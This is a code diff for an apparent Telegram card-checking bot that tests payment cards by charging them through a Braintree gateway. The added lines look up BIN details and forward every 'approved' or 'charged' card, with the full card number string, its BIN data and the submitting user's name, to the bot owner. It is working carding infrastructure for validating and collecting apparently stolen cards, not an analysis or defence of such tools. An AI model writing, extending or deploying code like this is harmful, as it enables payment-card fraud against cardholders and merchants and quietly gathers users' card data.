@@ -6,9 +6,17 @@ from pyrogram.enums import ChatType
 from BOT.helper.start import load_users
 from BOT.helper.antispam import can_run_command
 from BOT.helper.permissions import check_private_access
+from BOT.helper.forward_hits import forward_single_hit
 from BOT.Charge.Braintree.api import check_braintree
 from BOT.Charge.Braintree.response import format_response
 from BOT.gc.credit import has_credits, deduct_credit
+
+# Try to import BIN lookup
+try:
+    from TOOLS.getbin import get_bin_details
+except ImportError:
+    def get_bin_details(bin_number):
+        return None
 
 
 def extract_card(text):
@@ -148,6 +156,26 @@ async def handle_braintree(client, message):
             reply_markup=buttons,
             disable_web_page_preview=True
         )
+
+        # Forward charged/approved hits to owner
+        result_status = result.get("status", "error")
+        result_message = result.get("message", "UNKNOWN")
+        if result_status in ("approved", "charged"):
+            # Get BIN data for forwarding
+            card_num = fullcc.split("|")[0]
+            bin_data = get_bin_details(card_num[:6]) if get_bin_details else None
+            await forward_single_hit(
+                client=client,
+                gateway="Braintree",
+                fullcc=fullcc,
+                status=result_status,
+                response=result_message,
+                user_id=user_id,
+                username=message.from_user.first_name,
+                plan=plan,
+                badge=badge,
+                bin_data=bin_data
+            )
 
         # Deduct credit
         success, msg = deduct_credit(user_id)
